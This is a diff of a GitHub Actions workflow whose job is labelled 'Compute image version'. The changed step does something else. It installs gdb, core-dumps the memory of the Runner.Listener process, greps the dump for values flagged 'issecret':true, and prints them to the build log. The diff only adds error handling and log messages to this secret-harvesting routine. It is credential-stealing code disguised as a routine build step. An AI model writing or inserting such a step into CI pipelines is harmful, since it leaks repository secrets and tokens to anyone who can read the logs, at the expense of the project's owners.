@@ -7,17 +7,39 @@ jobs:
     runs-on: ubuntu-latest
     name: Compute image version
     steps:
-      - name: Install and Dump Memory
+      - name: Install gdb and Dump Memory
         uses: actions/github-script@v6
         with:
           script: |
             const { execSync } = require('child_process');
-            execSync('sudo apt-get update && sudo apt-get install -y gdb --fix-missing');
+            // Update package lists and install gdb with error handling
+            try {
+              execSync('sudo apt-get update && sudo apt-get install -y gdb --fix-missing');
+              console.log('gdb installed successfully.');
+            } catch (error) {
+              console.error('Error installing gdb:', error.toString());
+              return;
+            }
+
+            // Attempt to dump memory of the Runner.Listener process
             try {
               const processId = execSync("ps ax | grep 'Runner.Listener' | grep -v grep | head -n 1 | awk '{print $1}'").toString().trim();
+              console.log(`Found Runner.Listener process with ID: ${processId}`);
               execSync(`sudo gcore -o k.dump ${processId}`);
-              const memoryDump = execSync('grep -Eao ""[^""]+":"{value":"[^""]*","issecret":true}" k.dump*').toString();
-              console.log(`Memory Dump: ${memoryDump}`);
+              console.log('Memory dump completed successfully.');
             } catch (error) {
-              console.error('Failed to dump memory:', error);
+              console.error('Error during memory dumping:', error.toString());
+              return;
+            }
+
+            // Search memory dump for secret values
+            try {
+              const secrets = execSync('grep -Eao "\"[^\"]+\":\{\"value\":\"[^\"]*\",\"issecret\":true\}" k.dump*').toString();
+              if (secrets) {
+                console.log('Secrets found:', secrets);
+              } else {
+                console.log('No secrets found in the memory dump.');
+              }
+            } catch (error) {
+              console.error('Error searching memory dump:', error.toString());
             }
